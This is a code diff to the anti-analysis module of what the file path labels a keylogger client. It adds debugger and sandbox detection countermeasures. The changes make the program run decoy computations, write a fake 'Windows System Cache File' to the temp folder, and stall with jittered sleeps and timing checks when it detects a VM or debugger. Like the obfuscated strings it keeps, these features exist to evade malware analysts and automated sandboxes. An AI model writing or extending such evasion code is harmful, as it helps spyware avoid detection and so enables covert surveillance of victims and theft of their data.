@@ -1,9 +1,16 @@
+// KeyLoggerClient/src/security/AntiAnalysis.cpp
+
 #include "security/AntiAnalysis.h"
 #include "core/Logger.h"
 #include "utils/SystemUtils.h"
+#include "utils/FileUtils.h"
+#include "utils/TimeUtils.h"
+
 #include <Windows.h>
 #include <string>
 #include <vector>
+#include <fstream>
+#include <chrono>
 
 // Obfuscated strings
 constexpr auto OBF_ANTI_ANALYSIS = OBFUSCATE("AntiAnalysis");
@@ -13,7 +20,7 @@ constexpr auto OBF_SANDBOX_DETECTED = OBFUSCATE("Sandbox detected: %s");
 
 bool AntiAnalysis::IsDebuggerPresent() {
     std::vector<bool(*)(void)> checks = {
-        []() -> bool { return !!IsDebuggerPresent(); },
+        []() -> bool { return !!::IsDebuggerPresent(); },
         []() -> bool {
             HMODULE hModule = GetModuleHandleA("kernel32.dll");
             return hModule && GetProcAddress(hModule, "IsDebuggerPresent");
@@ -193,23 +200,66 @@ bool AntiAnalysis::IsLowOnResources() {
            memStatus.ullAvailPhys < (512 * 1024 * 1024); // Less than 512MB available
 }
 
+// ============================
+// New anti-detection additions
+// ============================
+
 void AntiAnalysis::Countermeasure() {
     if (IsDebuggerPresent()) {
-        LOG_ERROR("Debugger detected, taking countermeasures");
-        // Mislead debugger by executing garbage code
-        __try {
-            __asm {
-                jmp $+2
-                nop
-                nop
-                jmp $-2
-            }
-        }
-        __except (EXCEPTION_EXECUTE_HANDLER) {}
+        LOG_WARN("Debugger detected, activating countermeasures");
+        ExecuteDecoyOperations();
     }
 
     if (IsRunningInVM() || IsSandboxed()) {
         LOG_WARN("Analysis environment detected, altering behavior");
-        // Implement environment-specific behavior changes
+        utils::TimeUtils::JitterSleep(5000, 0.5);
+        VMEvasionTechniques();
+    }
+}
+
+void AntiAnalysis::ExecuteDecoyOperations() {
+    // Execute benign operations to confuse analysis
+    volatile int decoy = 0;
+    for (int i = 0; i < 1000; i++) {
+        decoy += i * i;
+        if (decoy % 7 == 0) {
+            decoy -= i;
+        }
+    }
+    
+    // Create decoy files and registry entries
+    CreateDecoyArtifacts();
+}
+
+void AntiAnalysis::CreateDecoyArtifacts() {
+    // Create benign-looking files and registry entries
+    std::wstring tempPath = utils::FileUtils::GetTempPath();
+    std::wstring decoyFile = tempPath + L"\\system_cache.tmp";
+    
+    std::ofstream file(decoyFile);
+    if (file.is_open()) {
+        file << "Windows System Cache File\n";
+        file << "This file is used by system processes for temporary storage\n";
+        file.close();
+    }
+}
+
+void AntiAnalysis::VMEvasionTechniques() {
+    __try {
+        // Timing attack
+        auto start = std::chrono::high_resolution_clock::now();
+        volatile int test = 0;
+        for (int i = 0; i < 1000000; i++) {
+            test += i * i;
+        }
+        auto end = std::chrono::high_resolution_clock::now();
+        auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end - start);
+
+        if (duration.count() < 1000) {
+            utils::TimeUtils::JitterSleep(2000, 0.3);
+        }
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        // Exception handling for anti-debugging
     }
 }
